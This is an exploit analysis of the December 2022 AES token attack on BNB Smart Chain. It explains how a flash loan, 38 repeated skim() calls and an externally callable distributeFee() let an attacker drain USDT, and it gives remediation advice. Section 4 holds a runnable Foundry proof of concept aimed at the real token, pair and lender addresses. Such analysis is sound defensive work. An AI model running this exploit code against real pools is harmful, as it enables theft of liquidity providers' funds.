# AES — distributeFee() + 38× skim() Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-12 |
| **Protocol** | AES Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **AES Token** | [0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907](https://bscscan.com/address/0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **AES/USDT Pair** | [0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3](https://bscscan.com/address/0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **DODO Flash Loan** | [0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A](https://bscscan.com/address/0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A) |
| **Root Cause** | `distributeFee()` can be executed against an externally manipulated reserve state; triggered after accumulating reserve discrepancies via 38 repeated `skim()` calls |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/AES_exp.sol) |

---
## 1. Vulnerability Overview

The AES token included a `distributeFee()` function that automatically distributed transaction fees. This function calculated and distributed fees based on the pair's current balance state. The attacker flash-borrowed 100,000 USDT from DODO, bought AES via a USDT→AES swap, then transferred half of the AES directly to the pair. The attacker then called `skim()` on the pair 38 times in succession to maximize the `balanceOf(pair, AES) >> reserve(pair, AES)` discrepancy. Calling `distributeFee()` in this state caused fees to be grossly over-calculated based on the distorted balance, benefiting the attacker. Finally, `sync()` was called to normalize the reserves, and the flash loan was repaid via an AES→USDT reverse swap.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable distributeFee() - executable against a manipulated reserve/balance state
contract AESToken {
    address public pair; // AES/USDT pair
    uint256 public feeBalance; // accumulated fees

    // Externally callable - triggering after pair reserve manipulation yields distorted distribution
    function distributeFee() external {
        uint256 pairAESBalance = IERC20(address(this)).balanceOf(pair);
        uint256 pairReserveAES = IPair(pair).reserve0(); // or getReserves()

        // ❌ Treats the discrepancy between balanceOf and reserve as fees
        // After 38× skim(), balanceOf >> reserve causes massive fee calculation
        if (pairAESBalance > pairReserveAES) {
            uint256 excess = pairAESBalance - pairReserveAES;
            _distributeFeeToHolders(excess);
        }
    }
}

// ✅ Correct pattern - distributeFee() internal-only or preceded by sync()
contract SafeAESToken {
    // ✅ distributeFee called only from within the transfer hook
    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 fee = amount * feeRate / 1000;
        super._transfer(from, address(this), fee);
        _feeBalance += fee;
        super._transfer(from, to, amount - fee);
    }

    // ✅ No external access - uses internal state only
    function _distributeFeeToHolders() private {
        uint256 fee = _feeBalance;
        _feeBalance = 0;
        // distribute to holders
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**AES_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: `distributeFee()` can be executed against an externally manipulated reserve state; triggered after accumulating reserve discrepancies via 38 repeated `skim()` calls
    function distributeFee() external view returns (uint256) {}  // 0x26c4e60d  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 100,000 USDT from DODO
    │
    ├─[2] USDT → AES swap (PancakeSwap)
    │
    ├─[3] Transfer half of AES directly to pair
    │       pair.balanceOf(AES) increases, reserve unchanged
    │
    ├─[4] pair.skim(attacker) × 38 iterations
    │       Each skim() extracts excess + re-manipulates balanceOf
    │       Reserve discrepancy accumulates repeatedly
    │
    ├─[5] Call AES.distributeFee()
    │       ❌ Fee over-calculated based on manipulated balance/reserve state
    │       Distribution favorable to attacker
    │
    ├─[6] Call pair.sync()
    │       Synchronize reserves to current balances
    │
    ├─[7] AES → USDT reverse swap
    │
    ├─[8] Repay DODO flash loan
    │
    └─[9] Net profit: USDT arbitrage
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IAES {
    function distributeFee() external;
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IDODO {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

interface IPair {
    function skim(address to) external;
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract AESExploit is Test {
    IAES    aes    = IAES(0xdDc0CFF76bcC0ee14c3e73aF630C029fe020F907);
    IDODO   dodo   = IDODO(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IPair   pair   = IPair(0x40eD17221b3B2D8455F4F1a05CAc6b77c5f707e3);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20  USDT   = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 23_695_904);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT", USDT.balanceOf(address(this)), 18);
        dodo.flashLoan(100_000 * 1e18, 0, address(this), "");
        emit log_named_decimal_uint("[End] USDT", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256 amount, uint256, bytes calldata) external {
        // [Step 2] USDT → AES
        USDT.approve(address(router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(USDT); path[1] = address(aes);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );

        // [Step 3] Transfer half of AES to pair
        uint256 aesBal = aes.balanceOf(address(this));
        aes.transfer(address(pair), aesBal / 2);

        // [Step 4] 38× skim() iterations - maximize reserve discrepancy
        // ⚡ Each skim() extracts excess while generating new transfer fees
        for (uint256 i = 0; i < 38; i++) {
            pair.skim(address(this));
        }

        // [Step 5] Trigger distributeFee()
        // ⚡ Fees over-distributed under manipulated balance state
        aes.distributeFee();

        // [Step 6] sync() normalization
        pair.sync();

        // [Step 7] AES → USDT reverse swap
        aes.approve(address(router), type(uint256).max);
        path[0] = address(aes); path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            aes.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        // Repay flash loan
        USDT.transfer(address(dodo), amount);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | 38× skim() reserve discrepancy accumulation + distributeFee() manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | Flash loan → AES purchase → pair transfer → `skim()` × 38 → `distributeFee()` → `sync()` |
| **Prerequisites** | `distributeFee()` externally callable, fee calculation based on balanceOf/reserve discrepancy |
| **Impact** | USDT arbitrage profit (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Internalize distributeFee()**: Change visibility to `private` or `internal` so it cannot be called externally, and trigger it automatically only from within the `_transfer()` hook.
2. **Reserve-based validation**: Within `distributeFee()`, check both `getReserves()` and `balanceOf(pair)`, and reject execution if the difference between the two values exceeds a certain threshold.
3. **Restrict skim()**: Disable `skim()` or limit the number of calls in pairs containing fee-on-transfer tokens.

---
## 7. Lessons Learned

- **The significance of 38× skim()**: Beyond a simple reserve discrepancy, the repeated `skim()` calls leveraged the fee-on-transfer token's characteristics to incrementally maximize the discrepancy. This is a more sophisticated manipulation technique than a one-shot attack.
- **External exposure of distributeFee()**: Fee distribution functions should remain internal protocol logic. If they can be triggered arbitrarily from outside, they can be executed under a manipulated state.
- **fee-on-transfer + skim() combination**: The same fee-on-transfer + skim() pattern recurred across PLTD (2022-10), SEAMAN (2022-11), and AES (2022-12). Disabling `skim()` should become standard practice when designing BSC-based auto-liquidity tokens.